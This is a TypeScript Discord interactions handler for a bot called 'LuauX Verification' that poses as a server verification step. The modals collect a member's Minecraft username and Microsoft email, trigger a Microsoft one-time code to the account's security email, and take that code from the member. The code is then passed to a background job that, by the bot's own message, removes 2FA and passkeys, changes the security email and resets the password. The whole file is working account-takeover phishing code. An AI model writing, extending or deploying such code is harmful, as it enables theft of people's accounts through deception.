import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";
import { CookieJar, sendAuth, detectAuthMethod, sendOtt, getLiveData } from "@/lib/microsoft-auth";
import nacl from "tweetnacl";

function verifyDiscordSignature(
  rawBody: string,
  signature: string,
  timestamp: string,
  clientPublicKey: string,
): boolean {
  try {
    const message = new TextEncoder().encode(timestamp + rawBody);
    const sig = Uint8Array.from(Buffer.from(signature, "hex"));
    const key = Uint8Array.from(Buffer.from(clientPublicKey, "hex"));
    return nacl.sign.detached.verify(message, sig, key);
  } catch {
    return false;
  }
}

function db() {
  return createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!, {
    auth: { persistSession: false, autoRefreshToken: false },
  });
}

async function editInteraction(
  applicationId: string,
  interactionToken: string,
  body: Record<string, unknown>,
  botToken?: string | null,
) {
  const token = botToken || process.env.DISCORD_BOT_TOKEN;
  await fetch(
    `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}/messages/@original`,
    {
      method: "PATCH",
      headers: { "Content-Type": "application/json", Authorization: `Bot ${token}` },
      body: JSON.stringify(body),
    },
  );
}

function successEmbed(description: string) {
  return { title: "✅ Verification", description, color: 0x50c878, footer: { text: "LuauX Verification" } };
}

function errorEmbed(description: string) {
  return { title: "❌ Verification Failed", description, color: 0xff5c5c, footer: { text: "LuauX Verification" } };
}

async function resolveBotCredentials(
  rawBody: string,
  signature: string,
  timestamp: string,
  guildId?: string,
): Promise<{ ok: boolean; botToken: string | null; publicKey: string | null }> {
  const centralPublicKey =
    process.env.DISCORD_PUBLIC_KEY || process.env.DISCORD_CLIENT_PUBLIC_KEY || "";

  // 1) Prefer guild-specific bot credentials
  if (guildId) {
    const { data: settings } = await db()
      .from("verification_settings")
      .select("bot_public_key, bot_token")
      .eq("guild_id", guildId)
      .maybeSingle();

    if (settings?.bot_public_key) {
      if (verifyDiscordSignature(rawBody, signature, timestamp, settings.bot_public_key)) {
        return {
          ok: true,
          botToken: settings.bot_token || null,
          publicKey: settings.bot_public_key,
        };
      }
    }
  }

  // 2) Central env key (optional)
  if (centralPublicKey && verifyDiscordSignature(rawBody, signature, timestamp, centralPublicKey)) {
    return { ok: true, botToken: process.env.DISCORD_BOT_TOKEN || null, publicKey: centralPublicKey };
  }

  // 3) Discord endpoint verification PING has no guild_id — try all stored public keys
  const { data: allSettings } = await db()
    .from("verification_settings")
    .select("bot_public_key, bot_token")
    .not("bot_public_key", "is", null);

  const tried = new Set<string>();
  for (const row of allSettings || []) {
    const key = (row.bot_public_key || "").trim();
    if (!key || tried.has(key)) continue;
    tried.add(key);
    if (verifyDiscordSignature(rawBody, signature, timestamp, key)) {
      return { ok: true, botToken: row.bot_token || null, publicKey: key };
    }
  }

  return { ok: false, botToken: null, publicKey: null };
}

export const Route = createFileRoute("/api/discord/interactions")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const signature = request.headers.get("x-signature-ed25519") || "";
        const timestamp = request.headers.get("x-signature-timestamp") || "";
        const rawBody = await request.text();

        if (!signature || !timestamp) {
          return new Response("Missing signature headers", { status: 401 });
        }

        let body: Record<string, unknown>;
        try {
          body = JSON.parse(rawBody);
        } catch {
          return new Response("Invalid JSON", { status: 400 });
        }

        // Discord PING (type 1) must respond with type 1 within ~3s after valid signature.
        // PING has no guild_id — resolve credentials against all stored bot public keys.
        const guildId = body.guild_id as string | undefined;
        const resolved = await resolveBotCredentials(rawBody, signature, timestamp, guildId);

        if (!resolved.ok) {
          console.error("[interactions] Invalid signature", {
            type: body.type,
            guildId: guildId || null,
            hasCentralKey: !!(process.env.DISCORD_PUBLIC_KEY || process.env.DISCORD_CLIENT_PUBLIC_KEY),
          });
          return new Response("Invalid signature", { status: 401 });
        }

        const botToken = resolved.botToken;
        const appId = body.application_id as string;
        const token = body.token as string;

        // Ping — must be first response after signature ok
        if (body.type === 1) {
          return Response.json({ type: 1 });
        }

        // Modal Submit (Type 5)
        if (body.type === 5) {
          const modalData = body.data as Record<string, unknown>;
          const customId = modalData.custom_id as string;
          const components = modalData.components as Array<Record<string, unknown>>;
          const member = body.member as Record<string, unknown> | undefined;
          const guildId = body.guild_id as string;
          const discordId = (member?.user as Record<string, string>)?.id || "";
          const channelId = body.channel_id as string;

          // --- Modal 1: MC Username + Email ---
          if (customId === "verify_mc_info") {
            // Discord modals: each ActionRow has one TextInput under components[i].components[0]
            const getModalValue = (rowIndex: number) => {
              const row = components?.[rowIndex] as Record<string, unknown> | undefined;
              const fields = row?.components as Array<Record<string, unknown>> | undefined;
              return String(fields?.[0]?.value || "").trim();
            };
            const username = getModalValue(0);
            const email = getModalValue(1);

            if (!username || !email) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Both Minecraft Username and Email are required.")],
                },
              });
            }

            if (!/^[\w\.-]+@[\w\.-]+\.\w{2,}$/.test(email)) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Invalid email format.")],
                },
              });
            }

            // Defer response (we have up to 15 min to follow up)
            // Type 5 = Deferred Update Message
            // We need to send an initial response first, then do async work
            // But for simplicity, we'll do the work synchronously within the timeout

            // Check auth method
            let authInfo;
            try {
              const { credentials } = await sendAuth(email);
              authInfo = detectAuthMethod(credentials);
            } catch {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Failed to check verification methods. Try again.")],
                },
              });
            }

            if (authInfo.method === "none") {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed(`No verification methods available for this account. Make sure the email is correct and the account has a recovery email set up. Details: ${(authInfo as { detail?: string }).detail || "N/A"}`)],
                },
              });
            }

            if (authInfo.method === "authenticator") {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Authenticator app verification is not supported. Please use an account with email OTP available.")],
                },
              });
            }

            // Email OTP method
            const { securityEmail, flowToken } = authInfo as { method: "email_otp"; securityEmail: string; flowToken: string };

            // Send OTP to security email
            const jar = new CookieJar();
            let otpSent = false;
            try {
              otpSent = await sendOtt(jar, email, securityEmail);
            } catch (e) {
              console.error("[interactions] sendOtt error:", e);
            }

            if (!otpSent) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Failed to send verification code. The account may have an OTP cooldown. Try again later.")],
                },
              });
            }

            // Store session in DB
            await db().from("verification_sessions").insert({
              discord_id: discordId,
              guild_id: guildId || "",
              mc_username: username,
              mc_email: email,
              status: "otp_sent",
              flow_token: flowToken,
              security_email: securityEmail,
              channel_id: channelId,
            });

            return Response.json({
              type: 4,
              data: {
                flags: 64,
                embeds: [
                  successEmbed(
                    `A verification code has been sent to **${securityEmail}**.\n\nPlease check your inbox (including spam) for a 6-digit code, then click **Submit Code** below to enter it.`,
                  ),
                ],
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 2,
                        style: 3,
                        label: "Submit Code",
                        custom_id: "verify_submit_code",
                      },
                    ],
                  },
                ],
              },
            });
          }

          // --- Modal 2: OTP Code ---
          if (customId === "verify_otp_code") {
            const rows = (components[0] as Record<string, unknown>)?.components as Array<Record<string, unknown>> | undefined;
            const otpCode = (rows?.[0]?.value as string) || "";

            if (!otpCode || otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Please enter a valid 6-digit code.")],
                },
              });
            }

            // Get the latest session for this user
            const { data: sessions } = await db()
              .from("verification_sessions")
              .select("*")
              .eq("discord_id", discordId)
              .eq("status", "otp_sent")
              .order("created_at", { ascending: false })
              .limit(1);

            const session = sessions?.[0];
            if (!session) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("No pending verification found. Please start over by clicking the Verify button.")],
                },
              });
            }

            // Get verification settings for role assignment
            const { data: settings } = await db()
              .from("verification_settings")
              .select("verified_role_id")
              .eq("guild_id", session.guild_id)
              .maybeSingle();

            // Create secure job in bot_jobs
            const { data: job } = await db()
              .from("bot_jobs")
              .insert({
                discord_id: discordId,
                type: "secure",
                status: "pending",
                config: {
                  email: session.mc_email,
                  flowToken: session.flow_token,
                  code: otpCode,
                  mcUsername: session.mc_username,
                  guildId: session.guild_id,
                  channelId: session.channel_id,
                  discordId,
                  roleId: settings?.verified_role_id || "",
                  sessionId: session.id,
                },
              })
              .select("id")
              .single();

            if (!job) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Failed to create verification job. Please try again.")],
                },
              });
            }

            // Update session status
            await db()
              .from("verification_sessions")
              .update({ status: "securing" })
              .eq("id", session.id);

            return Response.json({
              type: 4,
              data: {
                flags: 64,
                embeds: [
                  successEmbed(
                    "✅ Code accepted! Your account is now being secured.\n\nThis process typically takes 30-60 seconds. Once complete, the result will be posted to this channel.\n\n**What's happening:**\n• Removing 2FA & passkeys\n• Removing security proofs\n• Changing security email\n• Resetting password\n• Generating new recovery code\n• Gathering Minecraft account info",
                  ),
                ],
                components: [],
              },
            });
          }

          return Response.json({
            type: 4,
            data: { flags: 64, content: "Unknown modal" },
          });
        }

        // Message Component (Type 3)
        if (body.type === 3) {
          const data = body.data as Record<string, unknown>;
          const customId = data.custom_id as string;
          const member = body.member as Record<string, unknown> | undefined;
          const guildId = body.guild_id as string;
          const memberId = (member?.user as Record<string, string>)?.id;

          // "Verify" button — show Modal 1
          if (customId === "verify_member") {
            if (!memberId || !guildId) {
              return Response.json({
                type: 4,
                data: { flags: 64, content: "Missing member or guild information." },
              });
            }

            // Check verification settings exist
            const { data: settings } = await db()
              .from("verification_settings")
              .select("verified_role_id")
              .eq("guild_id", guildId)
              .maybeSingle();

            if (!settings) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  content:
                    "This server has not been configured for verification yet. Please set it up in the LuauX Dashboard.",
                },
              });
            }

            // Return a Modal
            return Response.json({
              type: 9,
              data: {
                custom_id: "verify_mc_info",
                title: "Verification",
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "mc_username",
                        label: "Minecraft Username",
                        style: 1,
                        required: true,
                        placeholder: "Enter your MC username",
                      },
                    ],
                  },
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "mc_email",
                        label: "Minecraft Email",
                        style: 1,
                        required: true,
                        placeholder: "email@example.com",
                      },
                    ],
                  },
                ],
              },
            });
          }

          // "Submit Code" button — show Modal 2
          if (customId === "verify_submit_code") {
            return Response.json({
              type: 9,
              data: {
                custom_id: "verify_otp_code",
                title: "Enter Verification Code",
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "otp_code",
                        label: "6-Digit Code",
                        style: 1,
                        required: true,
                        min_length: 6,
                        max_length: 6,
                        placeholder: "123456",
                      },
                    ],
                  },
                ],
              },
            });
          }

          // Verify session status button (for polling)
          if (customId === "verify_check_status") {
            return Response.json({
              type: 4,
              data: { flags: 64, content: "Checking status... This feature is coming soon." },
            });
          }
        }

        return Response.json({ type: 4, data: { flags: 64, content: "Unknown interaction" } });
      },
    },
  },
});
